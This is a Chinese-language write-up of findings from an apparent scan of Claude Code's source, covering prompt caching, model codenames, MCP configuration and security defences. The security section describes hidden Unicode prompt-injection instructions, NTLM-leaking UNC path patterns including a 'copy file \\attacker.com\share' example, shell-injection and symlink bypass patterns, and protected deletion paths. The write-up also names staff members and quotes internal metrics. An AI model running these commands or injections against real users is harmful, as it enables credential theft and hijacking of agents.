# Claude Code 源码深挖发现集

> 逐文件扫描 ~1,900 个 TypeScript 文件后的完整发现记录。每个条目标注源文件位置。

---

## 一、系统提示词工程——比你想象的复杂得多

### 1. 提示缓存分界线

`src/constants/prompts.ts`

系统提示词被一个边界标记分为**静态可缓存**和**动态每轮变化**两部分：

```typescript
export const SYSTEM_PROMPT_DYNAMIC_BOUNDARY = '__SYSTEM_PROMPT_DYNAMIC_BOUNDARY__'
```

分界线之前的内容在多轮对话中被缓存（节省 API 调用成本），之后的内容每轮重新计算。这一设计直接影响了代码组织——所有"稳定"指令放前面，"易变"内容放后面。

### 2. 危险的非缓存 section

`src/constants/systemPromptSections.ts`

创建会打破缓存的 section 需要提供**理由**：

```typescript
export function DANGEROUS_uncachedSystemPromptSection(
  name: string,
  compute: ComputeFn,
  _reason: string,  // 必须解释为什么需要打破缓存
): SystemPromptSection
```

目前唯一使用的理由是：`"MCP servers connect/disconnect between turns"`——MCP 服务器可能在两轮之间连接/断开。

### 3. @[MODEL LAUNCH] 标记系统

`src/constants/prompts.ts` 全文散布着模型发布标记：

```
// @[MODEL LAUNCH]: Update the latest frontier model.
// @[MODEL LAUNCH]: Update comment writing for Capybara — remove once model stops over-commenting
// @[MODEL LAUNCH]: capy v8 assertiveness counterweight (PR #24302)
// @[MODEL LAUNCH]: False-claims mitigation for Capybara v8 (29-30% FC rate vs v4's 16.7%)
// @[MODEL LAUNCH]: Remove this section when we launch numbat.
```

这些标记是**新模型发布清单**——每次发布新模型（如从 Capybara 到 Numbat）时，全局搜索 `@[MODEL LAUNCH]` 就能找到所有需要更新的地方。注意 "Capybara v8 的虚假声称率 29-30%，而 v4 只有 16.7%"——这是内部质量指标的直接泄露。

### 4. 网络安全指令由 Safeguards 团队管控

`src/constants/cyberRiskInstruction.ts`

```typescript
// IMPORTANT: DO NOT MODIFY THIS INSTRUCTION WITHOUT SAFEGUARDS TEAM REVIEW
// This instruction is owned by the Safeguards team and has been carefully crafted and evaluated
// Contact: David Forsythe, Kyla Guru
// If you need to modify this instruction:
//   1. Contact the Safeguards team
//   2. Ensure proper evaluation of the changes
//   3. Get explicit approval before merging
```

直接暴露了 Anthropic 安全团队的两位成员名字和内部审批流程。

### 5. 验证代理——独立对抗性验证

`src/constants/prompts.ts`（仅 ant 用户 + GrowthBook gate `tengu_hive_evidence`）

```
The contract: when non-trivial implementation happens on your turn, independent
adversarial verification must happen before you report completion. Non-trivial
means: 3+ file edits, backend/API changes, or infrastructure changes.

Spawn the Agent tool with subagent_type="verification". Your own checks, caveats,
and a fork's self-checks do NOT substitute — only the verifier assigns a verdict.
```

这是一个**强制性的独立验证机制**：每次非平凡实现后，必须生成一个独立的"对抗性验证代理"来检查工作质量。你自己的检查不算数。

### 6. 知识截止日期精确到模型

```typescript
function getKnowledgeCutoff(modelId: string): string | null {
  if (canonical.includes('claude-sonnet-4-6')) return 'August 2025'
  if (canonical.includes('claude-opus-4-6'))   return 'May 2025'
  if (canonical.includes('claude-haiku-4'))    return 'February 2025'
}
```

Sonnet 4.6 的知识截止日期（August 2025）比 Opus 4.6（May 2025）晚 3 个月。

### 7. 数值长度锚——1.2% 的 token 节省

```typescript
// Ant-only
'Length limits: keep text between tool calls to ≤25 words. Keep final responses
to ≤100 words unless the task requires more detail.'
```

注释说这比定性的"be concise"节省了约 1.2% 的输出 token。数值锚定比模糊指令更有效。

---

## 二、安全系统——多层防御的艺术

### 8. Unicode 隐身攻击防御

`src/utils/sanitization.ts`

引用了真实的 HackerOne 漏洞报告：

```typescript
// Reference: HackerOne #3086545 (Claude Desktop MCP vulnerability)
// Attackers hide instructions using Unicode Tag characters invisible to users
// but processed by AI

export function partiallySanitizeUnicode(prompt: string): string {
  current = current.normalize('NFKC')
  // 清除不可见字符类：格式字符(Cf)、私用区(Co)、未分配(Cn)
  current = current.replace(/[\p{Cf}\p{Co}\p{Cn}]/gu, '')
  // 显式清除：零宽空格、方向控制、BOM
}
```

对整个对象树递归清理——字符串、数组、嵌套对象。

### 9. UNC 路径凭据泄露防御——8 种模式

`src/utils/shell/readOnlyCommandValidation.ts`

Windows 上 UNC 路径（`\\server\share`）会自动发送 NTLM 凭据。Claude Code 检查了 **8 种变体**：

1. 反斜杠 UNC：`\\server\share`
2. 正斜杠 UNC：`//server/share`（排除 URL 中的 `://`）
3. 混合分隔符：`/\\server`（bash 转义后变成 UNC）
4. WebDAV 攻击：`\\server@SSL@8443\`、`\\server\DavWWWRoot\`
5. IPv4 UNC：`\\192.168.1.1\share`
6. IPv6 UNC：`\\[2001:db8::1]\share`
7. 端口变体：`\\server@port\share`
8. SSL 变体：`\\server@ssl\share`

攻击场景：`copy file \\attacker.com\share` 会泄露用户的 NTLM 哈希。

### 10. 符号链接攻击防御——全链路追踪

`src/utils/fsOperations.ts`

不仅检查起点和终点，还追踪**中间所有符号链接目标**：

```typescript
// Example: test.txt → /etc/passwd → /private/etc/passwd
// Returns: [test.txt, /etc/passwd, /private/etc/passwd]
// 防止攻击者通过中间链接绕过 deny 规则
```

还使用 `O_NOFOLLOW` flag 防止创建文件时的符号链接跟随攻击。

### 11. Shell 扩展注入防御

`src/utils/permissions/pathValidation.ts`

防止 shell 在验证**之后**扩展变量/命令：

```typescript
// 阻止：$VAR, ${VAR}, $(cmd) — Unix 变量/命令替换
// 阻止：%VAR% — Windows 环境变量
// 阻止：=cmd — Zsh equals 扩展
// 原因：Shell 在验证之后扩展这些，创建 TOCTOU 间隙
```

Tilde 扩展也被限制——只允许 `~` 和 `~/`，阻止 `~user`、`~+`、`~-`。

### 12. 大小写不敏感路径比较——防止 macOS/Windows 绕过

```typescript
// 防止通过 .cLauDe/Settings.locaL.json 绕过 macOS/Windows 的文件保护
export function normalizeCaseForComparison(path: string): string {
  return path.toLowerCase()
}
```

### 13. 危险路径删除保护

阻止删除的路径：
- 通配符 `*` 或以 `/*` 结尾
- 根目录 `/`
- Home 目录 `~`
- 根的直接子目录（`/usr`、`/tmp`、`/etc`）
- Windows 驱动器根（`C:\`）及其直接子目录（`C:\Windows`）

### 14. Bash 命令安全——双层防御

`src/tools/BashTool/bashPermissions.ts`

1. **AST 解析**（Tree-sitter）：解析为抽象语法树，检测隐藏的命令替换
2. **正则 fallback**（~20 种注入模式）：AST 不可用时的降级

```typescript
// CC-643: 防止 splitCommand 误解析复合命令
// "cd src\&\& python3 hello.py" 中的转义反斜杠
// 在 AST 之前先验证，防止 deny 规则被绕过
```

### 15. bypass 模式仍有不可绕过的安全检查

即使在 `bypassPermissions` 模式下：
- 所有 deny 规则仍然生效
- 路径遍历检查仍然运行
- 危险文件保护仍然运行
- Windows 模式检查仍然运行
- `classifierApprovable: false` 的 ask 规则仍然提示

---

## 三、查询管道——流式处理的精妙设计

### 16. 流式空闲看门狗

`src/query.ts`

```typescript
// 如果 90 秒没有收到任何 chunk，中断请求
// 追踪 >30 秒的间隙作为 stall 事件
```

### 17. "被扣留"的错误——自动恢复

`src/query.ts`

三种错误被**扣留**（不立即返回给调用者），尝试自动恢复：
- `prompt_too_long`：触发响应式压缩
- 图片尺寸错误：剥离图片后重试
- `max_output_tokens`：升级 token 限制后重试（最多 3 次）

只有恢复失败后才把错误透传给 SDK。

### 18. 流式工具并行执行

```typescript
// 新的 StreamingToolExecutor：工具在下一个 API 请求启动的同时并行执行
// 不阻塞等待工具完成
```

### 19. Fast mode 冷却策略

`src/services/api/withRetry.ts`

```typescript
if (retryAfterMs < SHORT_RETRY_THRESHOLD_MS) {
  // 短延迟：保持 fast mode，保留 prompt cache
  await sleep(retryAfterMs)
} else {
  // 长延迟：触发冷却，切换到标准速度
  triggerFastModeCooldown(Date.now() + cooldownMs, reason)
}
```

短重试保留 prompt cache（不切换模式），长重试才降级。

### 20. 上下文压缩——自动 compact

`src/services/compact/`

- 自动压缩缓冲区：**13,000 tokens**
- 压缩前剥离图片（避免压缩 API 本身触发 prompt_too_long）
- 在 forked agent 中运行（避免死锁）
- 压缩后重新注入 top-5 文件和 top-5 技能（token 预算上限 25K/30K）
- 熔断器：连续 3 次压缩失败后停止尝试

### 21. Token 预算感知

```typescript
// 检查轮内 token 预算使用百分比
// 可以引导代理拆分工作为更小的块
// 在收益递减时提前停止
```

---

## 四、MCP 系统——6 种传输 + 7 层配置

### 22. MCP 传输类型

`src/services/mcp/types.ts`

| 传输 | 用途 |
|------|------|
| `stdio` | 子进程通信（最常见） |
| `sse` / `sse-ide` | Server-Sent Events（远程服务器 + IDE） |
| `http` | HTTP StreamableHTTPClientTransport |
| `ws` / `ws-ide` | WebSocket 双向通信 |
| `sdk` | 进程内 SDK 桥接 |
| `claudeai-proxy` | claude.ai 连接器代理（URL 重写） |

### 23. 7 层 MCP 配置优先级

```
1. local          — 项目私有（内存中）
2. project        — .mcp.json（项目根目录）
3. user           — ~/.claude/config.json
4. dynamic        — CLI --mcp-config
5. enterprise     — /claude/managed/managed-mcp.json
6. claudeai       — claude.ai 市场（异步拉取）
7. plugin         — 插件提供的服务器
```

### 24. MCP 服务器去重——签名匹配

```typescript
// stdio 服务器：stdio:<JSON-serialized command>
// 远程服务器：url:<unwrapped vendor URL>
// 手动配置的服务器压制插件重复（用户意图 > 自动化）
```

### 25. XAA 跨应用认证

`src/services/mcp/auth.ts`

SEP-990 企业功能——允许跨应用共享 IdP token。支持：
- 自动 OpenID Connect 元数据发现
- 浏览器授权流 + 手动代码 fallback
- Lockfile 并发控制
- State/Nonce CSRF 防护

---

## 五、配置与迁移——模型进化的考古学

### 26. 模型代号迁移历史

`src/migrations/`

| 迁移 | 含义 |
|------|------|
| `migrateFennecToOpus` | Fennec → Opus（fennec 是 Opus 的早期代号） |
| `migrateLegacyOpusToCurrent` | opus-4-0, opus-4-1 → opus |
| `migrateOpusToOpus1m` | opus → opus[1m]（仅 Max/Team Premium） |
| `migrateSonnet45ToSonnet46` | sonnet-4-5 → sonnet（仅付费用户） |
| `resetProToOpusDefault` | 重置 Pro 用户的默认模型 |

**关键发现**：`fennec` 是 Opus 的内部代号。迁移是订阅感知的——Pro 用户和 Max 用户走不同路径。

### 27. 四层 CLAUDE.md 记忆体系

`src/utils/claudemd.ts`

```
1. /etc/claude-code/CLAUDE.md    — 管理员全局指令
2. ~/.claude/CLAUDE.md           — 用户私有全局指令
3. CLAUDE.md / .claude/CLAUDE.md — 项目级
4. CLAUDE.local.md               — 项目级（gitignore）
```

支持 `@include` 指令引用外部文件，有循环引用检测，最大 40KB。

### 28. 5 层设置系统

`src/utils/settings/`

```
1. userSettings    — ~/.claude/settings.json
2. projectSettings — .claude/settings.json
3. localSettings   — .claude.local/settings.json
4. flagSettings    — CLI --settings
5. policySettings  — 企业远程管理
```

后面的覆盖前面的。每层都可以定义权限规则、hooks、环境变量、MCP 服务器。

### 29. Hook 系统——4 种类型

`src/schemas/hooks.ts`

```typescript
discriminatedUnion('type', [
  { type: 'command',  command: string, timeout?, async?, asyncRewake? },
  { type: 'prompt',   prompt: string, model? },
  { type: 'http',     url: string, headers?, timeout? },
  { type: 'agent',    prompt: string, timeout?, model? },
])
```

每种 hook 都支持 `if` 条件（权限规则语法过滤）和 `once` 单次执行。

---

## 六、UI 彩蛋与隐藏功能

### 30. 200+ 个加载动词

`src/constants/spinnerVerbs.ts`

Spinner 会随机选择一个动词显示：

> Beboppin', Boondoggling, Clauding, Discombobulating, Flibbertigibbeting, Hullaballooing, Moonwalking, Prestidigitating, Razzle-dazzling, Tomfoolering, Whatchamacalliting...

### 31. 努力等级指示器

```
○ — low
◐ — medium
● — high
◉ — max (Opus only)
```

### 32. 终端截图渲染

`src/utils/ansiToSvg.ts`、`src/utils/ansiToPng.ts`

可以将 ANSI 终端输出转为 SVG/PNG 图片。支持 256 色和 24 位真彩色，有明/暗主题色板。

### 33. /btw——不中断主对话的侧问

`src/commands/btw/`

生成一个 forked 微会话，回答快速侧问后返回主对话上下文。

### 34. /stickers——贴纸商店

`src/commands/stickers/`

打开 Sticker Mule 商店页面，可以购买 Claude Code 官方贴纸。

### 35. /thinkback——年度回顾

`src/commands/thinkback/`

根据使用数据生成动画年度回顾（类似 Spotify Wrapped）。GrowthBook gate `tengu_thinkback`。隐藏子命令 `/thinkback-play` 播放动画。

### 36. 文件历史与 /rewind

`src/utils/fileHistory.ts`、`src/commands/rewind/`

完整的文件快照系统（最多 100 个快照），支持将代码恢复到任何历史检查点。

### 37. 智能通知系统

`src/services/notifier.ts`

根据终端类型选择通知方式：
- iTerm2：使用原生 iTerm2 通知
- Kitty：Kitty 通知协议
- Ghostty：Ghostty 通知
- Apple Terminal：检测 bell 配置

### 38. Tip 建议引擎

`src/services/tips/`

- 冷却机制（每 N 个会话显示一次）
- 基于使用模式的相关性过滤
- 记住最近显示过的 tips
- 检测到可用的 marketplace 插件时自动推荐

### 39. 项目引导状态机

`src/projectOnboardingState.ts`

两步引导流程：
1. 在空目录中：提示创建应用/克隆仓库
2. 有文件后：提示运行 `/init` 创建 CLAUDE.md
3. 查看 4 次后自动显示引导
4. 完成后永不再显示

---

## 七、认证系统——优先级链与安全隔离

### 40. API Key 来源优先级

`src/utils/auth.ts`

```
1. ANTHROPIC_API_KEY 环境变量
2. CLAUDE_CODE_OAUTH_TOKEN 环境变量
3. OAuth token from file descriptor
4. apiKeyHelper 命令执行（5 分钟缓存）
5. macOS Keychain
6. 配置文件存储
```

### 41. Session Ingress 三层 Token

`src/utils/sessionIngressAuth.ts`

```
1. CLAUDE_CODE_SESSION_ACCESS_TOKEN（动态更新）
2. CLAUDE_CODE_WEBSOCKET_AUTH_FILE_DESCRIPTOR（/dev/fd/N）
3. ~/.claude/remote/.session_ingress_token（子进程 fallback）
```

### 42. OAuth 多环境支持

`src/constants/oauth.ts`

- Production：`platform.claude.com` + `claude.ai`
- Staging：`platform.staging.ant.dev`（内部）
- Local：`localhost:8000/4000/3000`
- Custom：FedStart 部署（白名单限制）

---

## 八、Co-Authored-By 归属系统

### 43. 字符级贡献追踪

`src/utils/commitAttribution.ts`

```typescript
// 追踪 Claude 对文件的字符级贡献
// 计算文件归属百分比
// SHA-256 哈希追踪文件内容变化
// 会话恢复时保留归属快照
```

### 44. 模型名脱敏

内部仓库显示真实模型名（如 "Claude Opus 4.6"），外部仓库显示通用名称（如 "Claude"）。允许的内部仓库有白名单。Undercover 模式完全移除归属。

### 45. 会话归属元数据

追踪的不只是编辑：
- Prompt count（Claude 轮次数）
- Permission prompt count（用户决策点数）
- Escape count（用户通过 ESC 取消数）
- Surface origin（CLI vs 其他界面）

---

## 九、输出风格系统

### 46. 三种内置输出风格

`src/constants/outputStyles.ts`

| 风格 | 描述 |
|------|------|
| Default | 无特殊格式 |
| Explanatory | 提供实现选择的教育性洞察，带星号格式块 |
| Learning | **交互式学习模式**——暂停并请求用户贡献 2-10 行代码 |

Learning 模式是最有趣的——Claude 会在关键设计决策处停下来，要求用户自己写代码。

---

## 十、其他隐藏细节

### 47. moreright——神秘的内部 Hook

`src/moreright/useMoreRight.tsx`

外部构建中完全 stub，有 `onBeforeQuery` 和 `onTurnComplete` 生命周期钩子。可能是内部实验性的消息操作系统。

### 48. native-ts 原生模块

`src/native-ts/`

性能关键模块用原生代码：
- `color-diff`：Diff 计算引擎
- `file-index`：文件索引系统
- `yoga-layout`：布局计算（31KB）

### 49. Scratchpad 目录

```typescript
// 每个会话都有独立的临时文件目录
// 代替 /tmp 使用，免权限提示
// 会话结束后清理
```

### 50. 日期缓存防 cache bust

`src/constants/common.ts`

```typescript
// 会话开始时缓存日期，避免午夜切换时打破 prompt cache
export const getSessionStartDate = memoize(getLocalISODate)

// 返回 "Month YYYY" 而非具体日期——每月才变一次
export function getLocalMonthYear(): string
```

### 51. Subagent 文件路径规则

```typescript
// Agent 线程的 cwd 在每次 bash 调用间被重置
// 因此只能使用绝对路径
// 最终响应必须分享相关的绝对文件路径
// 代码片段只在文本直接承载意义时才包含
```

### 52. Proactive 模式——自主代理

当启用 PROACTIVE 或 KAIROS 时，Claude 变成自主代理：

```
You are running autonomously. You will receive <tick> prompts that keep you alive.

If you have nothing useful to do on a tick, you MUST call Sleep.
On first tick, greet the user briefly and ask what they'd like to work on.
Do not start exploring unprompted — wait for direction.

terminalFocus field:
- Unfocused: User is away. Lean heavily into autonomous action.
- Focused: User is watching. Be more collaborative.
```

根据用户是否在看终端调整自主程度——这是一个真正的"自主 AI 代理"模式。

### 53. Bridge 动画帧

`src/constants/figures.ts`

```typescript
// Bridge 状态动画帧：
·|·  ·/·  ·—·  ·\·  ·✓·  ×
```

六帧循环动画表示桥接连接状态。

### 54. 前沿模型声明

```typescript
const FRONTIER_MODEL_NAME = 'Claude Opus 4.6'

const CLAUDE_4_5_OR_4_6_MODEL_IDS = {
  opus: 'claude-opus-4-6',
  sonnet: 'claude-sonnet-4-6',
  haiku: 'claude-haiku-4-5-20251001',
}
```

Haiku 仍在 4.5 版本（2025-10-01），尚未更新到 4.6。

---

## 发现统计

| 类别 | 发现数 |
|------|--------|
| 系统提示词工程 | 7 |
| 安全防御机制 | 8 |
| 查询管道设计 | 6 |
| MCP 系统 | 4 |
| 配置与迁移 | 4 |
| UI 彩蛋与隐藏功能 | 10 |
| 认证系统 | 3 |
| 归属系统 | 3 |
| 输出风格 | 1 |
| 其他 | 8 |
| **总计** | **54** |
